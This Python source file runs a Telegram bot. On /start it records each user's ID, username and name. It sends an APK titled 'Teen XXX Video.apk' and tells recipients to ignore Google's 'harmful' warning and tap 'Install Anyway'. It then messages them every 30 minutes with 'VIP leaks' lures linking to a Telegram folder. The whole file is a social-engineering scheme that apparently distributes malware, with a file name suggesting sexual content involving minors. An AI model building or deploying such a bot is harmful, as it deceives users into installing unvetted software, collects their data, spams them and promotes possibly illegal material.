from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN
import asyncio, json, os, random

ADMIN_ID = os.getenv("ADMIN_ID")  # set in Railway later

# Rotating messages
messages = [
    "📥 New content just dropped! Join now: https://t.me/addlist/6Fswvlhfpy40YTFl",
    "😈 Baka ma-miss mo 'to! Click and enter: https://t.me/addlist/6Fswvlhfpy40YTFl",
    "🔥 VIP leaks updated. 18+ only: https://t.me/addlist/6Fswvlhfpy40YTFl",
    "📸 Bagong photos & vids uploaded. Silip ka na: https://t.me/addlist/6Fswvlhfpy40YTFl",
    "💪 Real drops, real leaks. Only here: https://t.me/addlist/6Fswvlhfpy40YTFl",
    "📣 Ikaw na lang ang kulang. Pasok na: https://t.me/addlist/6Fswvlhfpy40YTFl"
]

# Save user to JSON
def save_user(user):
    try:
        with open("users.json", "r") as f:
            users = json.load(f)
    except:
        users = []

    if user.id not in [u["id"] for u in users]:
        users.append({
            "id": user.id,
            "username": user.username or "",
            "name": user.full_name
        })
        with open("users.json", "w") as f:
            json.dump(users, f, indent=2)

# Scheduled auto-message
async def send_auto_msg(context: ContextTypes.DEFAULT_TYPE):
    try:
        with open("users.json", "r") as f:
            users = json.load(f)
    except:
        users = []

    for user in users:
        try:
            msg = random.choice(messages)
            await context.bot.send_message(chat_id=user["id"], text=msg)
        except Exception as e:
            print(f"❌ Failed to message user {user['id']}: {e}")

# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    save_user(user)

    await update.message.reply_document(
        document=open("media/Teen XXX Video.apk", "rb"),
        caption=(
            "📥 *Download the App for Exclusive Videos & Photos!*\n\n"
            "⚠️ *Note:* Google may flag this as 'harmful' because it's not from the PlayStore. "
            "Don't worry, it's safe. Just click *Install Anyway*.\n\n"
            "🔞 *Reminder: 18+ only before installing!*"
        ),
        parse_mode="Markdown"
    )

    context.job_queue.run_repeating(
        send_auto_msg, interval=1800, first=1800, name=str(user.id)
    )

# Broadcast command
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        return

    if not context.args:
        await update.message.reply_text("⚠️ Usage: /broadcast your_message_here")
        return

    message = " ".join(context.args)
    try:
        with open("users.json", "r") as f:
            users = json.load(f)
    except:
        users = []

    count = 0
    for user in users:
        try:
            await context.bot.send_message(chat_id=user["id"], text=message)
            count += 1
        except:
            continue

    await update.message.reply_text(f"✅ Broadcast sent to {count} users.")

if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("broadcast", broadcast))

    print("✅ Bot running...")
    app.run_polling()
